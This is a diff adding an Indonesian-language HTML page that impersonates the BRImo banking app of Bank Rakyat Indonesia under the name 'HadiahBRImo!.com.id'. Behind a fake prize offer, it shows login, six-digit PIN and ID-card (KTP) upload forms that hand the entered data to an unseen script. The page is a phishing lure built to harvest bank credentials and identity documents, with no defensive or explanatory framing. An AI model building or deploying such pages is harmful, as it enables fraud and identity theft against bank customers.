@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HadiahBRImo!.com.id</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<!-- Splash -->
+<div id="splash">
+  <img src="logo.jpg" alt="BRImo Logo" />
+  <div class="splash-footer">
+    PT Bank Rakyat Indonesia Tbk diawasi oleh OJK dan peserta LPS
+    <div class="splash-version">Versi 2.82.0</div>
+  </div>
+</div>
+
+<!-- Landing -->
+<div id="landing">
+  <div class="top-bar">
+    <div class="flag-id">
+      <img src="Indonesia.jpg" alt="ID Flag">ID
+    </div>
+    <div class="brimo-logo">BRI<span>mo</span></div>
+    <button class="kontak-btn">Kontak Kami</button>
+  </div>
+  <div class="main">
+    <img src="beground.jpg" alt="Ilustrasi">
+    <div class="title">Selamat Datang di BRImo!</div>
+    <div class="subtitle">Jadilah teman yang serba bisa! Mulai dari Top Up Dompet Digital Beli Pulsa Transaksi QRIS sampai Beli Asuransi semuanya bisa di BRImo!</div>
+    <button class="button primary" onclick="showLogin()">Punya Akun BRImo</button>
+    <button class="button outline" onclick="showKTP()">Belum Punya Akun BRImo</button>
+  </div>
+</div>
+
+<!-- Login Page -->
+<div id="loginPage" class="form-container">
+  <h2>Masuk ke BRImo</h2>
+  <input type="text" id="username" placeholder="Username">
+  <input type="password" id="password" placeholder="Password">
+  <button class="button primary" onclick="showPin()">Lanjut</button>
+  <button class="button outline" onclick="backToHome()">Kembali</button>
+</div>
+
+<!-- PIN Page -->
+<div id="pinPage" class="form-container">
+  <h2>Masukkan PIN</h2>
+  <input type="password" id="pin" placeholder="PIN 6 Digit" maxlength="6">
+  <button class="button primary" onclick="sendLogin()">Lanjut</button>
+</div>
+
+<!-- QR Page -->
+<div id="qrPage" class="form-container">
+  <h2>Selamat! Anda mendapatkan hadiah.</h2>
+  <p>Silakan scan QR di bawah ini:</p>
+  <img src="kaget.jpg" id="qrImage" alt="QR Code">
+</div>
+
+<!-- KTP Upload Page -->
+<div id="ktpPage" class="form-container">
+  <h2>Upload Foto KTP</h2>
+  <input type="file" id="ktpFile" accept="image/*" onchange="previewKTP(event)">
+  <img id="previewKTP" alt="Preview KTP" />
+  <button class="button primary" onclick="sendKTP()">Lanjut</button>
+  <button class="button outline" onclick="backToHome()">Kembali</button>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
